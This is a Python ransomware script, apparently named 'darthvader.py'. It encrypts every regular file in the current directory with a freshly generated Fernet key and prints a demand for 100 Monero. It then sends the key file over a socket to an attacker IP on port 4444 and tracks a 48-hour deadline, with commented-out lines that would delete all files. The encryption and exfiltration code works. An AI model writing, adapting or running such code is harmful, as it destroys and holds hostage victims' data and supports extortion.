import subprocess # Import the subprocess module
import sys # Import the sys module
import os # Import the os module
#Install cryptography module
def install(package): # Install the required package
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])

install('cryptography') # Install the cryptography package
from cryptography.fernet import Fernet  # Import the Fernet class from the cryptography module
import socket # Import the socket module
from datetime import datetime, timedelta # Import the datetime and timedelta classes from the datetime module

files = [] # List to store the files in the current directory

for file in os.listdir(): # Loop through the files in the current directory
    if file == "darthvader.py" or file == "key.key" or file == "decrypt.py" or file == "encryption_time.txt":
        continue
    if os.path.isfile(file): # Check if the file is a regular file
        files.append(file)
print(files)

key = Fernet.generate_key() # Generate a key

with open("key.key", "wb") as key_file: # Open the key file in write binary mode
    key_file.write(key) # Write the key to the file

for file in files: # Loop through the files
    try: # Try to encrypt the file
        with open(file, "rb") as f: # Open the file in read binary mode
            data = f.read() # Read the file
        data_encrypted = Fernet(key).encrypt(data) # Encrypt the file
        with open(file, "wb") as f: # Open the file in write binary mode
            f.write(data_encrypted) # Write the encrypted data to the file
    except Exception as e: # Handle any exceptions
        print(f"Error encrypting file {file}: {e}") # Print the error message

print("All files encrypted! Send me 100 Monero(XMR) to my wallet(WALLET)")

def send_file_to_host(file_path, host, port): # Send the key file to the attacker
    with open(file_path, 'rb') as file: # Open the file as binary
        data = file.read() # Read the file

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s: # Create a socket object
        s.connect((host, port)) # Connect to the attacker's server
        s.sendall(data) # Send the file

# Usage: send_file
try:    # Send the key file to the attacker
    send_file_to_host('key.key', '172.22.9.204', 4444) # Change the IP address to your IP address
except:
    print("Error sending key file Unreachable host")
# Store the encryption time
with open("encryption_time.txt", "w") as f:
    f.write(str(datetime.now()))
# Read the encryption time from the file
with open("encryption_time.txt", "r") as f:
    encryption_time = datetime.fromisoformat(f.read().strip())

# Check if 48 hours have passed
if datetime.now() - encryption_time > timedelta(hours=48): # 48 hours have passed
    # Check if the transfer has been made
    # This depends on your implementation
    # If the transfer has not been made, delete all files
    print("48 hours have passed")
#    for file in os.listdir():
#        os.remove(file)
#Delete the randsomware
#os.remove("darthvader.py")
